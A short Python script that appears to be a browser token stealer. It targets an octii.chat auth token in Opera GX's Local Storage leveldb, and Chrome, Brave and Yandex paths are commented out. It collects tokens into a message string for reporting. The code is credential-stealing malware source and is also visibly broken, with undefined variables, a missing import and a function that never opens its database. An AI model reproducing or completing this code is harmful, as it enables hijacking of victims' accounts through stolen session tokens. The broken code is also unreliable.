# This it unreliable as shit

import os
import re
import plyvel
import shutil
import tempfile

def copy_safe(*args, **kwargs):
    try:
        return shutil.copy2(*args, **kwargs)
    except Exception as e:
        print("Error copying file:", args, e)
        pass

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    with db.iterator() as it:
        for k, v in it:
            print(k, v)

    print(db.get(b'_https://octii.chat\x00\x01_cap_neko-token'))
    db.close()
    folder.cleanup()
    sys.exit(0)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        # 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        # 'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        # 'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        # 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

if __name__ == '__main__':
    main()